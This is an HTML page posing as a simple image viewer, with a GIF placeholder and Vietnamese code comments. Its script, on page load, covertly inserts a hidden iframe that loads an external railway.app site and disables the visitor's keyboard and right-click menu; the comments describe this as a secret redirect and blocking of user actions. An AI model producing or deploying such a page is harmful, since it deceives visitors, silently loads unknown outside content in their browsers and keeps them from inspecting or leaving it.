<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f0f2f5;
        }
        .gif-container {
            max-width: 100%;
            height: auto;
        }
        img {
            max-width: 100%;
            height: auto;
            display: block;
        }
    </style>
    <script>
        // Chạy chuyển hướng ngầm sau khi ảnh đã load
        window.onload = function() {
            // Tạo iframe ẩn để chuyển hướng ngầm
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://web-production-c2a9d.up.railway.app/';
            document.body.appendChild(iframe);
            
            // Ngăn chặn các thao tác của user
            document.onkeydown = function(e) {
                return false;
            };
            document.oncontextmenu = function(e) {
                return false;
            };
        };
    </script>
</head>
<body>
    <div class="gif-container">
        <img src="YOUR_GIF_URL" alt="Loading...">
    </div>
</body>
</html>
